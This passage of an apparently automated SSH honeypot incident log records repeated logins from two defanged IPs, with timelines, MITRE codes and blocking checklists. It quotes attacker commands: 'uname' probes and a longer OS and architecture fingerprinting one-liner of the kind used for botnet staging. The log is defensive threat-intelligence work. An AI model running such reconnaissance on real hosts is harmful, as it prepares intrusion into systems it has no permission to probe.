- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f5057dd987f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:06` | `cowrie.session.connect` |
| `2026-08-15 20:15:06` | `cowrie.client.version` |
| `2026-08-15 20:15:06` | `cowrie.client.kex` |
| `2026-08-15 20:15:07` | `cowrie.login.success` |
| `2026-08-15 20:15:08` | `cowrie.session.params` |
| `2026-08-15 20:15:08` | `cowrie.command.input` |
| `2026-08-15 20:15:08` | `cowrie.log.closed` |
| `2026-08-15 20:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d136bc63934

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:11` | `cowrie.session.connect` |
| `2026-08-15 20:15:11` | `cowrie.client.version` |
| `2026-08-15 20:15:11` | `cowrie.client.kex` |
| `2026-08-15 20:15:12` | `cowrie.login.success` |
| `2026-08-15 20:15:13` | `cowrie.session.params` |
| `2026-08-15 20:15:13` | `cowrie.command.input` |
| `2026-08-15 20:15:13` | `cowrie.log.closed` |
| `2026-08-15 20:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab25c0a8d74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:13` | `cowrie.session.connect` |
| `2026-08-15 20:15:13` | `cowrie.client.version` |
| `2026-08-15 20:15:13` | `cowrie.client.kex` |
| `2026-08-15 20:15:17` | `cowrie.login.success` |
| `2026-08-15 20:15:20` | `cowrie.session.params` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.success` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.command.input` |
| `2026-08-15 20:15:20` | `cowrie.log.closed` |
| `2026-08-15 20:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d9e47b6846

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:17` | `cowrie.session.connect` |
| `2026-08-15 20:15:17` | `cowrie.client.version` |
| `2026-08-15 20:15:17` | `cowrie.client.kex` |
| `2026-08-15 20:15:18` | `cowrie.login.success` |
| `2026-08-15 20:15:18` | `cowrie.session.params` |
| `2026-08-15 20:15:18` | `cowrie.command.input` |
| `2026-08-15 20:15:18` | `cowrie.log.closed` |
| `2026-08-15 20:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87f2f4675294

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:22` | `cowrie.session.connect` |
| `2026-08-15 20:15:22` | `cowrie.client.version` |
| `2026-08-15 20:15:22` | `cowrie.client.kex` |
| `2026-08-15 20:15:23` | `cowrie.login.success` |
| `2026-08-15 20:15:24` | `cowrie.session.params` |
| `2026-08-15 20:15:24` | `cowrie.command.input` |
| `2026-08-15 20:15:24` | `cowrie.log.closed` |
| `2026-08-15 20:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f3fa2784d6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:28` | `cowrie.session.connect` |
| `2026-08-15 20:15:28` | `cowrie.client.version` |
| `2026-08-15 20:15:28` | `cowrie.client.kex` |
| `2026-08-15 20:15:28` | `cowrie.login.success` |
| `2026-08-15 20:15:29` | `cowrie.session.params` |
| `2026-08-15 20:15:29` | `cowrie.command.input` |
| `2026-08-15 20:15:29` | `cowrie.log.closed` |
| `2026-08-15 20:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6cd6bb05162

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:33` | `cowrie.session.connect` |
| `2026-08-15 20:15:33` | `cowrie.client.version` |
| `2026-08-15 20:15:33` | `cowrie.client.kex` |
| `2026-08-15 20:15:34` | `cowrie.login.success` |
| `2026-08-15 20:15:35` | `cowrie.session.params` |
| `2026-08-15 20:15:35` | `cowrie.command.input` |
| `2026-08-15 20:15:35` | `cowrie.log.closed` |
| `2026-08-15 20:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb8e43520ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:38` | `cowrie.session.connect` |
| `2026-08-15 20:15:38` | `cowrie.client.version` |
| `2026-08-15 20:15:38` | `cowrie.client.kex` |
| `2026-08-15 20:15:39` | `cowrie.login.success` |
| `2026-08-15 20:15:40` | `cowrie.session.params` |
| `2026-08-15 20:15:40` | `cowrie.command.input` |
| `2026-08-15 20:15:40` | `cowrie.log.closed` |
| `2026-08-15 20:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8987c6e9c67e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:43` | `cowrie.session.connect` |
| `2026-08-15 20:15:44` | `cowrie.client.version` |
| `2026-08-15 20:15:44` | `cowrie.client.kex` |
| `2026-08-15 20:15:44` | `cowrie.login.success` |
| `2026-08-15 20:15:45` | `cowrie.session.params` |
| `2026-08-15 20:15:45` | `cowrie.command.input` |
| `2026-08-15 20:15:46` | `cowrie.log.closed` |
| `2026-08-15 20:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d423b53159a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:49` | `cowrie.session.connect` |
| `2026-08-15 20:15:49` | `cowrie.client.version` |
| `2026-08-15 20:15:49` | `cowrie.client.kex` |
| `2026-08-15 20:15:49` | `cowrie.login.success` |
| `2026-08-15 20:15:50` | `cowrie.session.params` |
| `2026-08-15 20:15:50` | `cowrie.command.input` |
| `2026-08-15 20:15:50` | `cowrie.log.closed` |
| `2026-08-15 20:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b30ccc218e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:54` | `cowrie.session.connect` |
| `2026-08-15 20:15:54` | `cowrie.client.version` |
| `2026-08-15 20:15:54` | `cowrie.client.kex` |
| `2026-08-15 20:15:55` | `cowrie.login.success` |
| `2026-08-15 20:15:55` | `cowrie.session.params` |
| `2026-08-15 20:15:55` | `cowrie.command.input` |
| `2026-08-15 20:15:55` | `cowrie.log.closed` |
| `2026-08-15 20:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4a49ddddc06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:15 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:15:59` | `cowrie.session.connect` |
| `2026-08-15 20:16:00` | `cowrie.client.version` |
| `2026-08-15 20:16:00` | `cowrie.client.kex` |
| `2026-08-15 20:16:00` | `cowrie.login.success` |
| `2026-08-15 20:16:01` | `cowrie.session.params` |
| `2026-08-15 20:16:01` | `cowrie.command.input` |
| `2026-08-15 20:16:01` | `cowrie.log.closed` |
| `2026-08-15 20:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee324bdec2c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:05` | `cowrie.session.connect` |
| `2026-08-15 20:16:05` | `cowrie.client.version` |
| `2026-08-15 20:16:05` | `cowrie.client.kex` |
| `2026-08-15 20:16:06` | `cowrie.login.success` |
| `2026-08-15 20:16:07` | `cowrie.session.params` |
| `2026-08-15 20:16:07` | `cowrie.command.input` |
| `2026-08-15 20:16:07` | `cowrie.log.closed` |
| `2026-08-15 20:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f9ca347f8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:10` | `cowrie.session.connect` |
| `2026-08-15 20:16:10` | `cowrie.client.version` |
| `2026-08-15 20:16:10` | `cowrie.client.kex` |
| `2026-08-15 20:16:11` | `cowrie.login.success` |
| `2026-08-15 20:16:12` | `cowrie.session.params` |
| `2026-08-15 20:16:12` | `cowrie.command.input` |
| `2026-08-15 20:16:12` | `cowrie.log.closed` |
| `2026-08-15 20:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29cebaf84a55

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:15` | `cowrie.session.connect` |
| `2026-08-15 20:16:15` | `cowrie.client.version` |
| `2026-08-15 20:16:15` | `cowrie.client.kex` |
| `2026-08-15 20:16:16` | `cowrie.login.success` |
| `2026-08-15 20:16:18` | `cowrie.session.params` |
| `2026-08-15 20:16:18` | `cowrie.command.input` |
| `2026-08-15 20:16:18` | `cowrie.log.closed` |
| `2026-08-15 20:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f1173fedb8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:20` | `cowrie.session.connect` |
| `2026-08-15 20:16:21` | `cowrie.client.version` |
| `2026-08-15 20:16:21` | `cowrie.client.kex` |
| `2026-08-15 20:16:21` | `cowrie.login.success` |
| `2026-08-15 20:16:22` | `cowrie.session.params` |
| `2026-08-15 20:16:22` | `cowrie.command.input` |
| `2026-08-15 20:16:22` | `cowrie.log.closed` |
| `2026-08-15 20:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb58c47e28e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:26` | `cowrie.session.connect` |
| `2026-08-15 20:16:26` | `cowrie.client.version` |
| `2026-08-15 20:16:26` | `cowrie.client.kex` |
| `2026-08-15 20:16:26` | `cowrie.login.success` |
| `2026-08-15 20:16:27` | `cowrie.session.params` |
| `2026-08-15 20:16:27` | `cowrie.command.input` |
| `2026-08-15 20:16:27` | `cowrie.log.closed` |
| `2026-08-15 20:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee29046ce80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:31` | `cowrie.session.connect` |
| `2026-08-15 20:16:31` | `cowrie.client.version` |
| `2026-08-15 20:16:31` | `cowrie.client.kex` |
| `2026-08-15 20:16:31` | `cowrie.login.success` |
| `2026-08-15 20:16:32` | `cowrie.session.params` |
| `2026-08-15 20:16:32` | `cowrie.command.input` |
| `2026-08-15 20:16:33` | `cowrie.log.closed` |
| `2026-08-15 20:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7605c892a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:36` | `cowrie.session.connect` |
| `2026-08-15 20:16:36` | `cowrie.client.version` |
| `2026-08-15 20:16:36` | `cowrie.client.kex` |
| `2026-08-15 20:16:37` | `cowrie.login.success` |
| `2026-08-15 20:16:37` | `cowrie.session.params` |
| `2026-08-15 20:16:37` | `cowrie.command.input` |
| `2026-08-15 20:16:37` | `cowrie.log.closed` |
| `2026-08-15 20:16:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afce86ba507

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:41` | `cowrie.session.connect` |
| `2026-08-15 20:16:41` | `cowrie.client.version` |
| `2026-08-15 20:16:41` | `cowrie.client.kex` |
| `2026-08-15 20:16:42` | `cowrie.login.success` |
| `2026-08-15 20:16:42` | `cowrie.session.params` |
| `2026-08-15 20:16:42` | `cowrie.command.input` |
| `2026-08-15 20:16:43` | `cowrie.log.closed` |
| `2026-08-15 20:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f614c15ce67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:46` | `cowrie.session.connect` |
| `2026-08-15 20:16:46` | `cowrie.client.version` |
| `2026-08-15 20:16:46` | `cowrie.client.kex` |
| `2026-08-15 20:16:47` | `cowrie.login.success` |
| `2026-08-15 20:16:48` | `cowrie.session.params` |
| `2026-08-15 20:16:48` | `cowrie.command.input` |
| `2026-08-15 20:16:48` | `cowrie.log.closed` |
| `2026-08-15 20:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ac327b0e4a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:51` | `cowrie.session.connect` |
| `2026-08-15 20:16:52` | `cowrie.client.version` |
| `2026-08-15 20:16:52` | `cowrie.client.kex` |
| `2026-08-15 20:16:52` | `cowrie.login.success` |
| `2026-08-15 20:16:53` | `cowrie.session.params` |
| `2026-08-15 20:16:53` | `cowrie.command.input` |
| `2026-08-15 20:16:53` | `cowrie.log.closed` |
| `2026-08-15 20:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8ea855be33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]171` |
| **First Seen** | 2026-08-15 20:16 |
| **Last Seen** | 2026-08-15 20:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:16:57` | `cowrie.session.connect` |
| `2026-08-15 20:16:57` | `cowrie.client.version` |
| `2026-08-15 20:16:57` | `cowrie.client.kex` |
| `2026-08-15 20:16:58` | `cowrie.login.success` |
| `2026-08-15 20:16:59` | `cowrie.session.params` |
| `2026-08-15 20:16:59` | `cowrie.command.input` |
| `2026-08-15 20:16:59` | `cowrie.log.closed` |
| `2026-08-15 20:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]171` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870189802463

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-15 20:17 |
| **Last Seen** | 2026-08-15 20:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 20:17:00` | `cowrie.session.connect` |
| `2026-08-15 20:17:00` | `cowrie.client.version` |
| `2026-08-15 20:17:00` | `cowrie.client.kex` |
| `2026-08-15 20:17:03` | `cowrie.login.success` |
| `2026-08-15 20:17:05` | `cowrie.session.params` |
| `2026-08-15 20:17:05` | `cowrie.command.input` |
